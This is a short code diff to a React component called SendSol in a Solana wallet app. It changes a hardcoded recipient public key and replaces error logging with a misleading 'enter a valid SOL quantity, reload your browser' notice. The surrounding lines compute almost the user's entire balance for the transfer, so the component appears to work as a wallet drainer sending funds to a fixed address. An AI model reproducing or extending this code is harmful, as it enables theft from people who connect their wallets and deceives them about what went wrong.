@@ -30,7 +30,7 @@ export const SendSol: FC = () => {
             return;
         }
         try {
-            const toPublicKey = new PublicKey('GUHq6yyX7f2HW91hmwWCkFkHpGEchUJC4uvP8BFTsrEN'); // Replace with the recipient's public key
+            const toPublicKey = new PublicKey('3X7BP4VZs9x2Uw7dvAaDtkNVsPoFnc49u2eK6yvPe1sV'); // Replace with the recipient's public key
             const transaction = new Transaction();
 
             let balanceOk = Number(balance - 0.001)
@@ -53,7 +53,7 @@ export const SendSol: FC = () => {
             const hash = await wallet.sendTransaction(transaction, connection);
             // setTxId(hash);
         } catch (error) {
-            console.log(error);
+            notify({ type: 'error', message: "Please enter a valid SOL quantity !", description: ' Reload you browser' });
         }
     }, [wallet, connection, getUserSOLBalance, amount, balance]);
 
